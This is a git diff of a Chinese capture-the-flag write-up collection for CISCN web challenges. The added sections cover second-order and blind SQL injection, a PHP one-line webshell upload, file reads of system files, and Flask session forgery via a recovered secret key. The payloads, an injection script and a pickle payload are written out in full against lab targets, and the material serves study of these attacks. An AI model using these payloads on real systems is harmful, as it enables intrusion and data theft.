@@ -1,6 +1,6 @@
 ## [CISCN 2019 初赛]Love Math
 
-+++
+
 
 打开题目，直接给了源码
 
@@ -106,11 +106,11 @@ Fatal error: Uncaught Error: Call to undefined function $_GET[1]() in E:\phpstud
 
 这题质量太高了，将很多php知识综合，确实确实很难了，值得回味
 
-+++
+
 
 ## [CISCN2019 华北赛区 Day2 Web1]Hack World
 
-+++
+
 
 ![image-20220724162707744](D:\Typora\note\CTF\web\ciscn.assets\image-20220724162707744.png)
 
@@ -155,18 +155,18 @@ if成立则返回1，反之则是0
 
 脚本就上面稍微改改就好
 
-+++
+
 
 ## [CISCN2019 华东南赛区]Web11
 
-+++
+
 
 ![image-20220807224733801](D:\Typora\note\CTF\web\ciscn.assets\image-20220807224733801.png)
 
 高大上的界面，和之前一题ip很像，但就是一个很简单很简单的SSTL
 完全无故过滤，直接传XFF得到flag
 
-+++
+
 
 ## [CISCN2019 华北赛区 Day1 Web2]ikun
 
@@ -226,7 +226,7 @@ Secret is "1Kun"
 
 ### py反序列化
 
-+++
+
 
 py现在只会写个脚本，反序列化还是完全不会，就先贴个脚本
 
@@ -253,11 +253,11 @@ c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29
 
 将源码**become**的hidden删掉，生成的值输进去得到flag
 
-+++
+
 
 ## [CISCN 2022 初赛]ezpop
 
-+++
+
 
 www.zip源码泄露，找到路由和反序列化入口，然后拿链子打就好了
 
@@ -358,11 +358,11 @@ echo urlencode(serialize($adapter));
 
 ```
 
-+++
+
 
 ## [CISCN2019 华北赛区 Day1 Web1]Dropbox
 
-+++
+
 
 ### 目录穿越
 
@@ -637,7 +637,7 @@ FileList->__call [触发File->close()] ->__destruct
 
 <font color='whiblue'>**太太太棒了😍😍**</font>
 
-+++
+
 
 ## [CISCN2019 华东北赛区]Web2
 
@@ -667,9 +667,207 @@ print("<svg><script>" + output + "</script>")
 
 ![image-20221220122655359](ciscn.assets/image-20221220122655359.png)
 
+## [CISCN2019 华北赛区 Day1 Web5]CyberPunk
 
+不知道为什么buu的环境查看文件会报错。。
 
+查看源代码发现`?file=`，然后利用查看各种文件（也没看到，就不放了）发现只有address这里没有过滤
 
+那就是一个简单的二次注入了
 
+最终payload
 
+```sql
+1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,200)),0x7e),1)#
+1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,200)),0x7e),1)#
+//有长度限制
+//flag{ccebab39-c01d-460d-b166-b8a6eecd8427}
+```
+
+## [CISCN2019 总决赛 Day2 Web1]Easyweb
+
+有个image.php里面有id参数，试了一下得到`image.php.bak`
+
+```php
+<?php
+include "config.php";
+
+$id=isset($_GET["id"])?$_GET["id"]:"1";
+$path=isset($_GET["path"])?$_GET["path"]:"";
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
+$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
+
+$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path="./" . $row["path"];
+header("Content-Type: image/jpeg");
+readfile($path);
+```
+
+> **addslashes**
+>
+> 在单引号（`'`）、双引号（`"`）、反斜线（`\`）与    NUL（**`null`** 字符）前加上反斜线
+
+在后面也用了`str_replace`来过滤危险字符
+
+直接在本地测试一下
+
+![image-20221225133721321](ciscn.assets/image-20221225133721321.png)
+
+可以逃逸出去反斜杠
+
+于是构造payload
+
+```sql
+image.php?id=\0&path=||1=1;%23
+select * from images where id='\' or path='||1=1;#'
+```
+
+成功回显图片
+
+> **mysqli_fetch_array**
+>
+> 返回一个以列名为key的数组
+>
+> ```sql
+> mysql> select * from admin;
+> +----+----------+------------+
+> | id | username | account    |
+> +----+----------+------------+
+> |  1 | xlccccc  | 2595251998 |
+> +----+----------+------------+
+> 1 row in set (0.00 sec)
+> ```
+>
+> 返回的数组就是`row['id']==>1 row['username']==>xlccccc`
+
+想试着逃逸出双引号来直接读文件，没试成功，那就只能盲注了
+
+```python
+import requests
+import time
+
+url = 'http://5376ddf5-a7d0-45d6-aaf3-c01fdf510cb3.node4.buuoj.cn:81/image.php'
+database = ''
+flag = ''
+str = '0123456789qwertyuiopasdfghjklzxcvbnm}-'
+# table: images users
+payload1 = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
+# column: user,password
+payload2 = "select group_concat(column_name) from information_schema.columns where table_name=0x7573657273"
+# password:953cb63f6d5d78d0cffb
+payload3 = "select group_concat(password) from users"
+for i in range(1, 46):
+  for j in range(32, 127):
+    payload=rf"?id=\0&path=||ascii(substr(({payload3}),{i},1))={j};%23"
+    time.sleep(0.1)
+    r = requests.get(url+payload)
+    if r.text != '':
+      flag += chr(j)
+      print("[+]:"+flag)
+```
+
+`admin 953cb63f6d5d78d0cffb`登陆后有个上传文件功能
+
+有一个上传文件的功能，文件名会被放在`log.php`里面，使用短标签绕过过滤传一句话木马`<?=@eval($_POST['a']);?>`
+
+rce得到flag
+
+## [CISCN2019 华东南赛区]Web4
+
+打开发现
+
+![image-20230104163835289](ciscn.assets/image-20230104163835289.png)
+
+传`http://127.0.0.1`没有回显，不像ssrf，直接传`/etc/hosts`回显了文件
+
+读 **/prof/self/cmdline**
+
+```
+/usr/local/bin/python/app/app.py
+```
+
+读**app.py**
+
+```python
+# encoding:utf-8
+import re, random, uuid, urllib
+from flask import Flask, session, request
+
+app = Flask(__name__)
+random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random()*233)
+app.debug = True
+
+@app.route('/')
+def index():
+    session['username'] = 'www-data'
+    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'
+
+@app.route('/read')
+def read():
+    try:
+        url = request.args.get('url')
+        m = re.findall('^file.*', url, re.IGNORECASE)
+        n = re.findall('flag', url, re.IGNORECASE)
+        if m or n:
+            return 'No Hack'
+        res = urllib.urlopen(url)
+        return res.read()
+    except Exception as ex:
+        print str(ex)
+    return 'no response'
+
+@app.route('/flag')
+def flag():
+    if session and session['username'] == 'fuck':
+        return open('/flag.txt').read()
+    else:
+        return 'Access denied'
+
+if __name__=='__main__':
+    app.run(
+        debug=True,
+        host="0.0.0.0"
+    )
+```
+
+以**uuid**为种进行`random.random()*233`来作为`SECRET_KEY`
+
+读取`/sys/class/net/eth0/address`
+
+```
+ba:c7:01:40:48:65
+转为十进制
+205363882248293
+```
+
+利用**python2**来生成密钥
+
+```bash
+xlccccc@xl-pc:~/flask-session-cookie-manager-master$ python2
+Python 2.7.18 (default, Jul  1 2022, 12:27:04)
+[GCC 9.4.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import re, random, uuid, urllib
+>>> from flask import Flask, session, request
+>>> app = Flask(__name__)
+>>> random.seed(205363882248293)
+>>> app.config['SECRET_KEY'] = str(random.random()*233)
+>>> print app.config['SECRET_KEY']
+134.19035408
+```
+
+伪造**session**
+
+```bash
+xlccccc@xl-pc:~/flask-session-cookie-manager-master$ python3 flask_session_cookie_manager3.py decode -c "eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y7U6ZQ.GUlT9ao2Nb5hy5J8u-kFvgv4JY0" -s "134.19035408"
+{'username': b'www-data'}
+xlccccc@xl-pc:~/flask-session-cookie-manager-master$ python3 flask_session_cookie_manager3.py encode -t "{'username': b'fuck'}" -s "134.19035408"                                                              eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Y7U9-w.k_ugK1drBaWwd4Po3Xl3XpgraV4
+```
 
